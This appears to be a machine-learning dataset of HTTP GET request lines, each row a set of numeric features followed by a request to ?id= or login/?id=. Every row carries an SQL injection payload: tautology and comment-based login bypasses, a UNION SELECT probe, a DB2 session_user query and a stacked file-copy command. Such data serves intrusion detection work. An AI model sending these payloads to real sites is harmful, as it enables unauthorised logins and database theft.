39,1,200,3276,7,9,8,2,1,GET login/?id=") or ("1"="1"-- HTTP/1.1
39,1,200,4776,7,9,8,2,1,GET login/?id=") or ("1"="1"-- HTTP/1.1
27,1,200,6994,7,4,5,1,1,GET ?id=" or 0=0 # HTTP/1.1
27,1,200,6179,7,4,5,1,1,GET ?id=" or 0=0 # HTTP/1.1
27,1,200,1476,7,4,5,1,1,GET ?id=" or 0=0 # HTTP/1.1
27,1,200,6327,7,4,5,1,1,GET ?id=" or 0=0 # HTTP/1.1
27,1,200,2559,7,4,5,1,1,GET ?id=" or 0=0 # HTTP/1.1
27,1,200,3847,7,4,5,1,1,GET ?id=" or 0=0 # HTTP/1.1
27,1,200,1972,7,4,5,1,1,GET ?id=" or 0=0 # HTTP/1.1
27,1,200,4378,7,4,5,1,1,GET ?id=" or 0=0 # HTTP/1.1
27,1,200,7497,7,4,5,1,1,GET ?id=" or 0=0 # HTTP/1.1
27,1,200,3099,7,4,5,1,1,GET ?id=" or 0=0 # HTTP/1.1
27,1,200,1445,7,4,5,1,1,GET ?id=" or 0=0 # HTTP/1.1
27,1,200,4823,7,4,5,1,1,GET ?id=" or 0=0 # HTTP/1.1
27,1,200,4932,7,4,5,1,1,GET ?id=" or 0=0 # HTTP/1.1
27,1,200,4217,7,4,5,1,1,GET ?id=" or 0=0 # HTTP/1.1
27,1,200,2481,7,4,5,1,1,GET ?id=" or 0=0 # HTTP/1.1
27,1,200,4858,7,4,5,1,1,GET ?id=" or 0=0 # HTTP/1.1
27,1,200,4070,7,4,5,1,1,GET ?id=" or 0=0 # HTTP/1.1
27,1,200,7669,7,4,5,1,1,GET ?id=" or 0=0 # HTTP/1.1
27,1,200,4523,7,4,5,1,1,GET ?id=" or 0=0 # HTTP/1.1
27,1,200,5753,7,4,5,1,1,GET ?id=" or 0=0 # HTTP/1.1
28,1,200,7768,7,8,6,1,1,GET ?id=' or true-- HTTP/1.1
28,1,200,7910,7,8,6,1,1,GET ?id=' or true-- HTTP/1.1
28,1,200,1116,7,8,6,1,1,GET ?id=' or true-- HTTP/1.1
28,1,200,5685,7,8,6,1,1,GET ?id=' or true-- HTTP/1.1
28,1,200,6738,7,8,6,1,1,GET ?id=' or true-- HTTP/1.1
28,1,200,4450,7,8,6,1,1,GET ?id=' or true-- HTTP/1.1
28,1,200,2181,7,8,6,1,1,GET ?id=' or true-- HTTP/1.1
28,1,200,4550,7,8,6,1,1,GET ?id=' or true-- HTTP/1.1
28,1,200,6277,7,8,6,1,1,GET ?id=' or true-- HTTP/1.1
28,1,200,1459,7,8,6,1,1,GET ?id=' or true-- HTTP/1.1
28,1,200,3952,7,8,6,1,1,GET ?id=' or true-- HTTP/1.1
28,1,200,2289,7,8,6,1,1,GET ?id=' or true-- HTTP/1.1
28,1,200,2004,7,8,6,1,1,GET ?id=' or true-- HTTP/1.1
28,1,200,6974,7,8,6,1,1,GET ?id=' or true-- HTTP/1.1
28,1,200,6991,7,8,6,1,1,GET ?id=' or true-- HTTP/1.1
28,1,200,6093,7,8,6,1,1,GET ?id=' or true-- HTTP/1.1
28,1,200,6779,7,8,6,1,1,GET ?id=' or true-- HTTP/1.1
28,1,200,2410,7,8,6,1,1,GET ?id=' or true-- HTTP/1.1
28,1,200,4883,7,8,6,1,1,GET ?id=' or true-- HTTP/1.1
28,1,200,1736,7,8,6,1,1,GET ?id=' or true-- HTTP/1.1
28,1,200,7374,7,8,6,1,1,GET ?id=' or true-- HTTP/1.1
28,1,200,4648,7,8,6,1,1,GET ?id=' or true-- HTTP/1.1
28,1,200,4104,7,8,6,1,1,GET ?id=' or true-- HTTP/1.1
28,1,200,4862,7,8,6,1,1,GET ?id=' or true-- HTTP/1.1
28,1,200,1706,7,8,6,1,1,GET ?id=' or true-- HTTP/1.1
28,1,200,5676,7,8,6,1,1,GET ?id=' or true-- HTTP/1.1
26,1,200,6494,7,7,4,2,1,GET login/?id="^" HTTP/1.1
26,1,200,4411,7,7,4,2,1,GET login/?id="^" HTTP/1.1
26,1,200,3569,7,7,4,2,1,GET login/?id="^" HTTP/1.1
26,1,200,2682,7,7,4,2,1,GET login/?id="^" HTTP/1.1
26,1,200,2478,7,7,4,2,1,GET login/?id="^" HTTP/1.1
26,1,200,7071,7,7,4,2,1,GET login/?id="^" HTTP/1.1
26,1,200,2443,7,7,4,2,1,GET login/?id="^" HTTP/1.1
26,1,200,4143,7,7,4,2,1,GET login/?id="^" HTTP/1.1
26,1,200,4940,7,7,4,2,1,GET login/?id="^" HTTP/1.1
26,1,200,5502,7,7,4,2,1,GET login/?id="^" HTTP/1.1
26,1,200,1987,7,7,4,2,1,GET login/?id="^" HTTP/1.1
26,1,200,4616,7,7,4,2,1,GET login/?id="^" HTTP/1.1
26,1,200,1623,7,7,4,2,1,GET login/?id="^" HTTP/1.1
26,1,200,4480,7,7,4,2,1,GET login/?id="^" HTTP/1.1
26,1,200,1736,7,7,4,2,1,GET login/?id="^" HTTP/1.1
26,1,200,3164,7,7,4,2,1,GET login/?id="^" HTTP/1.1
26,1,200,6021,7,7,4,2,1,GET login/?id="^" HTTP/1.1
26,1,200,4422,7,7,4,2,1,GET login/?id="^" HTTP/1.1
26,1,200,1942,7,7,4,2,1,GET login/?id="^" HTTP/1.1
26,1,200,7865,7,7,4,2,1,GET login/?id="^" HTTP/1.1
26,1,200,7528,7,7,4,2,1,GET login/?id="^" HTTP/1.1
43,1,200,3944,7,14,6,3,1,GET login/?id=admin") or "1"="1"/* HTTP/1.1
43,1,200,1334,7,14,6,3,1,GET login/?id=admin") or "1"="1"/* HTTP/1.1
43,1,200,5290,7,14,6,3,1,GET login/?id=admin") or "1"="1"/* HTTP/1.1
43,1,200,7964,7,14,6,3,1,GET login/?id=admin") or "1"="1"/* HTTP/1.1
43,1,200,1941,7,14,6,3,1,GET login/?id=admin") or "1"="1"/* HTTP/1.1
43,1,200,5894,7,14,6,3,1,GET login/?id=admin") or "1"="1"/* HTTP/1.1
43,1,200,5434,7,14,6,3,1,GET login/?id=admin") or "1"="1"/* HTTP/1.1
43,1,200,4912,7,14,6,3,1,GET login/?id=admin") or "1"="1"/* HTTP/1.1
43,1,200,7836,7,14,6,3,1,GET login/?id=admin") or "1"="1"/* HTTP/1.1
43,1,200,3852,7,14,6,3,1,GET login/?id=admin") or "1"="1"/* HTTP/1.1
43,1,200,1741,7,14,6,3,1,GET login/?id=admin") or "1"="1"/* HTTP/1.1
43,1,200,3035,7,14,6,3,1,GET login/?id=admin") or "1"="1"/* HTTP/1.1
43,1,200,4140,7,14,6,3,1,GET login/?id=admin") or "1"="1"/* HTTP/1.1
43,1,200,3380,7,14,6,3,1,GET login/?id=admin") or "1"="1"/* HTTP/1.1
43,1,200,7920,7,14,6,3,1,GET login/?id=admin") or "1"="1"/* HTTP/1.1
65,1,200,7253,7,42,5,2,1,GET login/?id=select session_user from sysibm.sysdummy1; HTTP/1.1
65,1,200,2793,7,42,5,2,1,GET login/?id=select session_user from sysibm.sysdummy1; HTTP/1.1
65,1,200,6146,7,42,5,2,1,GET login/?id=select session_user from sysibm.sysdummy1; HTTP/1.1
65,1,200,4879,7,42,5,2,1,GET login/?id=select session_user from sysibm.sysdummy1; HTTP/1.1
65,1,200,5840,7,42,5,2,1,GET login/?id=select session_user from sysibm.sysdummy1; HTTP/1.1
65,1,200,5578,7,42,5,2,1,GET login/?id=select session_user from sysibm.sysdummy1; HTTP/1.1
65,1,200,5929,7,42,5,2,1,GET login/?id=select session_user from sysibm.sysdummy1; HTTP/1.1
65,1,200,2383,7,42,5,2,1,GET login/?id=select session_user from sysibm.sysdummy1; HTTP/1.1
65,1,200,7264,7,42,5,2,1,GET login/?id=select session_user from sysibm.sysdummy1; HTTP/1.1
65,1,200,2991,7,42,5,2,1,GET login/?id=select session_user from sysibm.sysdummy1; HTTP/1.1
65,1,200,3256,7,42,5,2,1,GET login/?id=select session_user from sysibm.sysdummy1; HTTP/1.1
65,1,200,5646,7,42,5,2,1,GET login/?id=select session_user from sysibm.sysdummy1; HTTP/1.1
65,1,200,1182,7,42,5,2,1,GET login/?id=select session_user from sysibm.sysdummy1; HTTP/1.1
65,1,200,7184,7,42,5,2,1,GET login/?id=select session_user from sysibm.sysdummy1; HTTP/1.1
65,1,200,4770,7,42,5,2,1,GET login/?id=select session_user from sysibm.sysdummy1; HTTP/1.1
65,1,200,3582,7,42,5,2,1,GET login/?id=select session_user from sysibm.sysdummy1; HTTP/1.1
81,1,200,5434,24,15,4,1,1,GET ?id=" AND 1=0 UNION ALL SELECT ""_ "81dc9bdb52d04dc20036dbd8313ed055 HTTP/1.1
81,1,200,1813,24,15,4,1,1,GET ?id=" AND 1=0 UNION ALL SELECT ""_ "81dc9bdb52d04dc20036dbd8313ed055 HTTP/1.1
81,1,200,7069,24,15,4,1,1,GET ?id=" AND 1=0 UNION ALL SELECT ""_ "81dc9bdb52d04dc20036dbd8313ed055 HTTP/1.1
81,1,200,3303,24,15,4,1,1,GET ?id=" AND 1=0 UNION ALL SELECT ""_ "81dc9bdb52d04dc20036dbd8313ed055 HTTP/1.1
81,1,200,1726,24,15,4,1,1,GET ?id=" AND 1=0 UNION ALL SELECT ""_ "81dc9bdb52d04dc20036dbd8313ed055 HTTP/1.1
81,1,200,3555,24,15,4,1,1,GET ?id=" AND 1=0 UNION ALL SELECT ""_ "81dc9bdb52d04dc20036dbd8313ed055 HTTP/1.1
81,1,200,2703,24,15,4,1,1,GET ?id=" AND 1=0 UNION ALL SELECT ""_ "81dc9bdb52d04dc20036dbd8313ed055 HTTP/1.1
81,1,200,1469,24,15,4,1,1,GET ?id=" AND 1=0 UNION ALL SELECT ""_ "81dc9bdb52d04dc20036dbd8313ed055 HTTP/1.1
81,1,200,7820,24,15,4,1,1,GET ?id=" AND 1=0 UNION ALL SELECT ""_ "81dc9bdb52d04dc20036dbd8313ed055 HTTP/1.1
81,1,200,5345,24,15,4,1,1,GET ?id=" AND 1=0 UNION ALL SELECT ""_ "81dc9bdb52d04dc20036dbd8313ed055 HTTP/1.1
81,1,200,3319,24,15,4,1,1,GET ?id=" AND 1=0 UNION ALL SELECT ""_ "81dc9bdb52d04dc20036dbd8313ed055 HTTP/1.1
81,1,200,2211,24,15,4,1,1,GET ?id=" AND 1=0 UNION ALL SELECT ""_ "81dc9bdb52d04dc20036dbd8313ed055 HTTP/1.1
81,1,200,6992,24,15,4,1,1,GET ?id=" AND 1=0 UNION ALL SELECT ""_ "81dc9bdb52d04dc20036dbd8313ed055 HTTP/1.1
81,1,200,3753,24,15,4,1,1,GET ?id=" AND 1=0 UNION ALL SELECT ""_ "81dc9bdb52d04dc20036dbd8313ed055 HTTP/1.1
81,1,200,7115,24,15,4,1,1,GET ?id=" AND 1=0 UNION ALL SELECT ""_ "81dc9bdb52d04dc20036dbd8313ed055 HTTP/1.1
81,1,200,4965,24,15,4,1,1,GET ?id=" AND 1=0 UNION ALL SELECT ""_ "81dc9bdb52d04dc20036dbd8313ed055 HTTP/1.1
81,1,200,5019,24,15,4,1,1,GET ?id=" AND 1=0 UNION ALL SELECT ""_ "81dc9bdb52d04dc20036dbd8313ed055 HTTP/1.1
81,1,200,5096,24,15,4,1,1,GET ?id=" AND 1=0 UNION ALL SELECT ""_ "81dc9bdb52d04dc20036dbd8313ed055 HTTP/1.1
81,1,200,3287,24,15,4,1,1,GET ?id=" AND 1=0 UNION ALL SELECT ""_ "81dc9bdb52d04dc20036dbd8313ed055 HTTP/1.1
81,1,200,6341,24,15,4,1,1,GET ?id=" AND 1=0 UNION ALL SELECT ""_ "81dc9bdb52d04dc20036dbd8313ed055 HTTP/1.1
56,1,200,5969,7,20,13,2,1,GET login/?id=') or ('a'='a and hi") or ("a"="a HTTP/1.1
56,1,200,6615,7,20,13,2,1,GET login/?id=') or ('a'='a and hi") or ("a"="a HTTP/1.1
56,1,200,6906,7,20,13,2,1,GET login/?id=') or ('a'='a and hi") or ("a"="a HTTP/1.1
56,1,200,4127,7,20,13,2,1,GET login/?id=') or ('a'='a and hi") or ("a"="a HTTP/1.1
56,1,200,4098,7,20,13,2,1,GET login/?id=') or ('a'='a and hi") or ("a"="a HTTP/1.1
56,1,200,5151,7,20,13,2,1,GET login/?id=') or ('a'='a and hi") or ("a"="a HTTP/1.1
56,1,200,5472,7,20,13,2,1,GET login/?id=') or ('a'='a and hi") or ("a"="a HTTP/1.1
56,1,200,4967,7,20,13,2,1,GET login/?id=') or ('a'='a and hi") or ("a"="a HTTP/1.1
56,1,200,7998,7,20,13,2,1,GET login/?id=') or ('a'='a and hi") or ("a"="a HTTP/1.1
56,1,200,3825,7,20,13,2,1,GET login/?id=') or ('a'='a and hi") or ("a"="a HTTP/1.1
56,1,200,2851,7,20,13,2,1,GET login/?id=') or ('a'='a and hi") or ("a"="a HTTP/1.1
56,1,200,4780,7,20,13,2,1,GET login/?id=') or ('a'='a and hi") or ("a"="a HTTP/1.1
56,1,200,6637,7,20,13,2,1,GET login/?id=') or ('a'='a and hi") or ("a"="a HTTP/1.1
56,1,200,1805,7,20,13,2,1,GET login/?id=') or ('a'='a and hi") or ("a"="a HTTP/1.1
56,1,200,4334,7,20,13,2,1,GET login/?id=') or ('a'='a and hi") or ("a"="a HTTP/1.1
56,1,200,6697,7,20,13,2,1,GET login/?id=') or ('a'='a and hi") or ("a"="a HTTP/1.1
56,1,200,1250,7,20,13,2,1,GET login/?id=') or ('a'='a and hi") or ("a"="a HTTP/1.1
56,1,200,6737,7,20,13,2,1,GET login/?id=') or ('a'='a and hi") or ("a"="a HTTP/1.1
56,1,200,2414,7,20,13,2,1,GET login/?id=') or ('a'='a and hi") or ("a"="a HTTP/1.1
56,1,200,2314,7,20,13,2,1,GET login/?id=') or ('a'='a and hi") or ("a"="a HTTP/1.1
56,1,200,6380,7,20,13,2,1,GET login/?id=') or ('a'='a and hi") or ("a"="a HTTP/1.1
56,1,200,1101,7,20,13,2,1,GET login/?id=') or ('a'='a and hi") or ("a"="a HTTP/1.1
56,1,200,5691,7,20,13,2,1,GET login/?id=') or ('a'='a and hi") or ("a"="a HTTP/1.1
28,1,200,2678,7,4,8,1,1,GET ?id=' or '1'='1 HTTP/1.1
28,1,200,3021,7,4,8,1,1,GET ?id=' or '1'='1 HTTP/1.1
28,1,200,7151,7,4,8,1,1,GET ?id=' or '1'='1 HTTP/1.1
28,1,200,4210,7,4,8,1,1,GET ?id=' or '1'='1 HTTP/1.1
28,1,200,4782,7,4,8,1,1,GET ?id=' or '1'='1 HTTP/1.1
28,1,200,4328,7,4,8,1,1,GET ?id=' or '1'='1 HTTP/1.1
28,1,200,1293,7,4,8,1,1,GET ?id=' or '1'='1 HTTP/1.1
28,1,200,2906,7,4,8,1,1,GET ?id=' or '1'='1 HTTP/1.1
28,1,200,3100,7,4,8,1,1,GET ?id=' or '1'='1 HTTP/1.1
28,1,200,2136,7,4,8,1,1,GET ?id=' or '1'='1 HTTP/1.1
28,1,200,2108,7,4,8,1,1,GET ?id=' or '1'='1 HTTP/1.1
28,1,200,6806,7,4,8,1,1,GET ?id=' or '1'='1 HTTP/1.1
28,1,200,4814,7,4,8,1,1,GET ?id=' or '1'='1 HTTP/1.1
28,1,200,7755,7,4,8,1,1,GET ?id=' or '1'='1 HTTP/1.1
28,1,200,6392,7,4,8,1,1,GET ?id=' or '1'='1 HTTP/1.1
28,1,200,3813,7,4,8,1,1,GET ?id=' or '1'='1 HTTP/1.1
28,1,200,2273,7,4,8,1,1,GET ?id=' or '1'='1 HTTP/1.1
28,1,200,4250,7,4,8,1,1,GET ?id=' or '1'='1 HTTP/1.1
28,1,200,1281,7,4,8,1,1,GET ?id=' or '1'='1 HTTP/1.1
28,1,200,2938,7,4,8,1,1,GET ?id=' or '1'='1 HTTP/1.1
28,1,200,6438,7,4,8,1,1,GET ?id=' or '1'='1 HTTP/1.1
28,1,200,2607,7,4,8,1,1,GET ?id=' or '1'='1 HTTP/1.1
28,1,200,5577,7,4,8,1,1,GET ?id=' or '1'='1 HTTP/1.1
28,1,200,4499,7,4,8,1,1,GET ?id=' or '1'='1 HTTP/1.1
28,1,200,4757,7,4,8,1,1,GET ?id=' or '1'='1 HTTP/1.1
44,1,200,3500,7,14,13,2,1,GET login/?id=admin') or ('1'='1'-- HTTP/1.1
44,1,200,6247,7,14,13,2,1,GET login/?id=admin') or ('1'='1'-- HTTP/1.1
44,1,200,5208,7,14,13,2,1,GET login/?id=admin') or ('1'='1'-- HTTP/1.1
44,1,200,3275,7,14,13,2,1,GET login/?id=admin') or ('1'='1'-- HTTP/1.1
44,1,200,1362,7,14,13,2,1,GET login/?id=admin') or ('1'='1'-- HTTP/1.1
44,1,200,2857,7,14,13,2,1,GET login/?id=admin') or ('1'='1'-- HTTP/1.1
44,1,200,6815,7,14,13,2,1,GET login/?id=admin') or ('1'='1'-- HTTP/1.1
44,1,200,2583,7,14,13,2,1,GET login/?id=admin') or ('1'='1'-- HTTP/1.1
44,1,200,5115,7,14,13,2,1,GET login/?id=admin') or ('1'='1'-- HTTP/1.1
44,1,200,3936,7,14,13,2,1,GET login/?id=admin') or ('1'='1'-- HTTP/1.1
44,1,200,5505,7,14,13,2,1,GET login/?id=admin') or ('1'='1'-- HTTP/1.1
44,1,200,5894,7,14,13,2,1,GET login/?id=admin') or ('1'='1'-- HTTP/1.1
44,1,200,5865,7,14,13,2,1,GET login/?id=admin') or ('1'='1'-- HTTP/1.1
44,1,200,6264,7,14,13,2,1,GET login/?id=admin') or ('1'='1'-- HTTP/1.1
44,1,200,5788,7,14,13,2,1,GET login/?id=admin') or ('1'='1'-- HTTP/1.1
44,1,200,6954,7,14,13,2,1,GET login/?id=admin') or ('1'='1'-- HTTP/1.1
44,1,200,5261,7,14,13,2,1,GET login/?id=admin') or ('1'='1'-- HTTP/1.1
44,1,200,4982,7,14,13,2,1,GET login/?id=admin') or ('1'='1'-- HTTP/1.1
44,1,200,2764,7,14,13,2,1,GET login/?id=admin') or ('1'='1'-- HTTP/1.1
44,1,200,1121,7,14,13,2,1,GET login/?id=admin') or ('1'='1'-- HTTP/1.1
44,1,200,2418,7,14,13,2,1,GET login/?id=admin') or ('1'='1'-- HTTP/1.1
44,1,200,7899,7,14,13,2,1,GET login/?id=admin') or ('1'='1'-- HTTP/1.1
44,1,200,5393,7,14,13,2,1,GET login/?id=admin') or ('1'='1'-- HTTP/1.1
44,1,200,2094,7,14,13,2,1,GET login/?id=admin') or ('1'='1'-- HTTP/1.1
36,1,200,4176,7,11,10,2,1,GET login/?id=') or ('a'='a HTTP/1.1
36,1,200,6800,7,11,10,2,1,GET login/?id=') or ('a'='a HTTP/1.1
36,1,200,1443,7,11,10,2,1,GET login/?id=') or ('a'='a HTTP/1.1
36,1,200,4041,7,11,10,2,1,GET login/?id=') or ('a'='a HTTP/1.1
36,1,200,4864,7,11,10,2,1,GET login/?id=') or ('a'='a HTTP/1.1
36,1,200,1358,7,11,10,2,1,GET login/?id=') or ('a'='a HTTP/1.1
36,1,200,2568,7,11,10,2,1,GET login/?id=') or ('a'='a HTTP/1.1
36,1,200,5985,7,11,10,2,1,GET login/?id=') or ('a'='a HTTP/1.1
36,1,200,1550,7,11,10,2,1,GET login/?id=') or ('a'='a HTTP/1.1
36,1,200,2715,7,11,10,2,1,GET login/?id=') or ('a'='a HTTP/1.1
36,1,200,3935,7,11,10,2,1,GET login/?id=') or ('a'='a HTTP/1.1
36,1,200,7173,7,11,10,2,1,GET login/?id=') or ('a'='a HTTP/1.1
36,1,200,4416,7,11,10,2,1,GET login/?id=') or ('a'='a HTTP/1.1
31,1,200,5952,7,12,4,3,1,GET login/?id=admin"/* HTTP/1.1
31,1,200,2665,7,12,4,3,1,GET login/?id=admin"/* HTTP/1.1
31,1,200,3170,7,12,4,3,1,GET login/?id=admin"/* HTTP/1.1
31,1,200,4158,7,12,4,3,1,GET login/?id=admin"/* HTTP/1.1
31,1,200,6899,7,12,4,3,1,GET login/?id=admin"/* HTTP/1.1
31,1,200,4094,7,12,4,3,1,GET login/?id=admin"/* HTTP/1.1
31,1,200,4797,7,12,4,3,1,GET login/?id=admin"/* HTTP/1.1
31,1,200,7383,7,12,4,3,1,GET login/?id=admin"/* HTTP/1.1
31,1,200,2591,7,12,4,3,1,GET login/?id=admin"/* HTTP/1.1
31,1,200,1306,7,12,4,3,1,GET login/?id=admin"/* HTTP/1.1
31,1,200,1563,7,12,4,3,1,GET login/?id=admin"/* HTTP/1.1
31,1,200,6344,7,12,4,3,1,GET login/?id=admin"/* HTTP/1.1
31,1,200,6484,7,12,4,3,1,GET login/?id=admin"/* HTTP/1.1
31,1,200,5993,7,12,4,3,1,GET login/?id=admin"/* HTTP/1.1
31,1,200,1700,7,12,4,3,1,GET login/?id=admin"/* HTTP/1.1
31,1,200,1186,7,12,4,3,1,GET login/?id=admin"/* HTTP/1.1
69,1,200,6998,7,42,6,4,1,GET login/?id=select * from myfile;copy myfile to /tmp/test; HTTP/1.1
69,1,200,7335,7,42,6,4,1,GET login/?id=select * from myfile;copy myfile to /tmp/test; HTTP/1.1
69,1,200,3182,7,42,6,4,1,GET login/?id=select * from myfile;copy myfile to /tmp/test; HTTP/1.1
69,1,200,5732,7,42,6,4,1,GET login/?id=select * from myfile;copy myfile to /tmp/test; HTTP/1.1
69,1,200,5957,7,42,6,4,1,GET login/?id=select * from myfile;copy myfile to /tmp/test; HTTP/1.1
69,1,200,1778,7,42,6,4,1,GET login/?id=select * from myfile;copy myfile to /tmp/test; HTTP/1.1
69,1,200,5608,7,42,6,4,1,GET login/?id=select * from myfile;copy myfile to /tmp/test; HTTP/1.1
69,1,200,6244,7,42,6,4,1,GET login/?id=select * from myfile;copy myfile to /tmp/test; HTTP/1.1
69,1,200,2068,7,42,6,4,1,GET login/?id=select * from myfile;copy myfile to /tmp/test; HTTP/1.1
69,1,200,5082,7,42,6,4,1,GET login/?id=select * from myfile;copy myfile to /tmp/test; HTTP/1.1
69,1,200,5014,7,42,6,4,1,GET login/?id=select * from myfile;copy myfile to /tmp/test; HTTP/1.1
69,1,200,1987,7,42,6,4,1,GET login/?id=select * from myfile;copy myfile to /tmp/test; HTTP/1.1
69,1,200,3428,7,42,6,4,1,GET login/?id=select * from myfile;copy myfile to /tmp/test; HTTP/1.1
69,1,200,7775,7,42,6,4,1,GET login/?id=select * from myfile;copy myfile to /tmp/test; HTTP/1.1
31,1,200,7840,7,4,6,1,1,GET ?id=" or "1"="1"-- HTTP/1.1
31,1,200,3170,7,4,6,1,1,GET ?id=" or "1"="1"-- HTTP/1.1
31,1,200,5104,7,4,6,1,1,GET ?id=" or "1"="1"-- HTTP/1.1
31,1,200,6135,7,4,6,1,1,GET ?id=" or "1"="1"-- HTTP/1.1
31,1,200,5239,7,4,6,1,1,GET ?id=" or "1"="1"-- HTTP/1.1
31,1,200,5084,7,4,6,1,1,GET ?id=" or "1"="1"-- HTTP/1.1
31,1,200,6968,7,4,6,1,1,GET ?id=" or "1"="1"-- HTTP/1.1
31,1,200,5291,7,4,6,1,1,GET ?id=" or "1"="1"-- HTTP/1.1
31,1,200,3376,7,4,6,1,1,GET ?id=" or "1"="1"-- HTTP/1.1
31,1,200,1587,7,4,6,1,1,GET ?id=" or "1"="1"-- HTTP/1.1
31,1,200,1411,7,4,6,1,1,GET ?id=" or "1"="1"-- HTTP/1.1
31,1,200,6934,7,4,6,1,1,GET ?id=" or "1"="1"-- HTTP/1.1
31,1,200,7796,7,4,6,1,1,GET ?id=" or "1"="1"-- HTTP/1.1
31,1,200,5201,7,4,6,1,1,GET ?id=" or "1"="1"-- HTTP/1.1
31,1,200,5475,7,4,6,1,1,GET ?id=" or "1"="1"-- HTTP/1.1
31,1,200,3444,7,4,6,1,1,GET ?id=" or "1"="1"-- HTTP/1.1
31,1,200,3749,7,4,6,1,1,GET ?id=" or "1"="1"-- HTTP/1.1
31,1,200,5683,7,4,6,1,1,GET ?id=" or "1"="1"-- HTTP/1.1
42,1,200,4809,7,14,10,3,1,GET login/?id=admin' or '1'='1'/* HTTP/1.1
42,1,200,3922,7,14,10,3,1,GET login/?id=admin' or '1'='1'/* HTTP/1.1
42,1,200,4686,7,14,10,3,1,GET login/?id=admin' or '1'='1'/* HTTP/1.1
42,1,200,3404,7,14,10,3,1,GET login/?id=admin' or '1'='1'/* HTTP/1.1
42,1,200,5456,7,14,10,3,1,GET login/?id=admin' or '1'='1'/* HTTP/1.1
42,1,200,6031,7,14,10,3,1,GET login/?id=admin' or '1'='1'/* HTTP/1.1
42,1,200,2552,7,14,10,3,1,GET login/?id=admin' or '1'='1'/* HTTP/1.1
42,1,200,5243,7,14,10,3,1,GET login/?id=admin' or '1'='1'/* HTTP/1.1
42,1,200,3059,7,14,10,3,1,GET login/?id=admin' or '1'='1'/* HTTP/1.1
42,1,200,2604,7,14,10,3,1,GET login/?id=admin' or '1'='1'/* HTTP/1.1
42,1,200,7993,7,14,10,3,1,GET login/?id=admin' or '1'='1'/* HTTP/1.1
42,1,200,2260,7,14,10,3,1,GET login/?id=admin' or '1'='1'/* HTTP/1.1
42,1,200,1765,7,14,10,3,1,GET login/?id=admin' or '1'='1'/* HTTP/1.1
42,1,200,3345,7,14,10,3,1,GET login/?id=admin' or '1'='1'/* HTTP/1.1
42,1,200,4155,7,14,10,3,1,GET login/?id=admin' or '1'='1'/* HTTP/1.1
42,1,200,5005,7,14,10,3,1,GET login/?id=admin' or '1'='1'/* HTTP/1.1
42,1,200,5797,7,14,10,3,1,GET login/?id=admin' or '1'='1'/* HTTP/1.1
42,1,200,1108,7,14,10,3,1,GET login/?id=admin' or '1'='1'/* HTTP/1.1
42,1,200,5225,7,14,10,3,1,GET login/?id=admin' or '1'='1'/* HTTP/1.1
42,1,200,6258,7,14,10,3,1,GET login/?id=admin' or '1'='1'/* HTTP/1.1
42,1,200,7143,7,14,10,3,1,GET login/?id=admin' or '1'='1'/* HTTP/1.1
42,1,200,4847,7,14,10,3,1,GET login/?id=admin' or '1'='1'/* HTTP/1.1
42,1,200,2278,7,14,10,3,1,GET login/?id=admin' or '1'='1'/* HTTP/1.1
42,1,200,2593,7,14,10,3,1,GET login/?id=admin' or '1'='1'/* HTTP/1.1
42,1,200,1117,7,14,10,3,1,GET login/?id=admin' or '1'='1'/* HTTP/1.1
42,1,200,3674,7,14,10,3,1,GET login/?id=admin' or '1'='1'/* HTTP/1.1
19,1,200,4805,7,2,5,1,1,GET ?id=== HTTP/1.1
19,1,200,1440,7,2,5,1,1,GET ?id=== HTTP/1.1
19,1,200,7770,7,2,5,1,1,GET ?id=== HTTP/1.1
19,1,200,2423,7,2,5,1,1,GET ?id=== HTTP/1.1
19,1,200,6596,7,2,5,1,1,GET ?id=== HTTP/1.1
19,1,200,3252,7,2,5,1,1,GET ?id=== HTTP/1.1
19,1,200,4447,7,2,5,1,1,GET ?id=== HTTP/1.1
19,1,200,4618,7,2,5,1,1,GET ?id=== HTTP/1.1
19,1,200,6302,7,2,5,1,1,GET ?id=== HTTP/1.1
19,1,200,1607,7,2,5,1,1,GET ?id=== HTTP/1.1
19,1,200,7972,7,2,5,1,1,GET ?id=== HTTP/1.1
19,1,200,1132,7,2,5,1,1,GET ?id=== HTTP/1.1
19,1,200,4897,7,2,5,1,1,GET ?id=== HTTP/1.1
19,1,200,8000,7,2,5,1,1,GET ?id=== HTTP/1.1
35,1,200,5662,7,9,9,2,1,GET login/?id=%' or '0'='0 HTTP/1.1
35,1,200,2203,7,9,9,2,1,GET login/?id=%' or '0'='0 HTTP/1.1
35,1,200,5455,7,9,9,2,1,GET login/?id=%' or '0'='0 HTTP/1.1
35,1,200,7515,7,9,9,2,1,GET login/?id=%' or '0'='0 HTTP/1.1
35,1,200,3549,7,9,9,2,1,GET login/?id=%' or '0'='0 HTTP/1.1
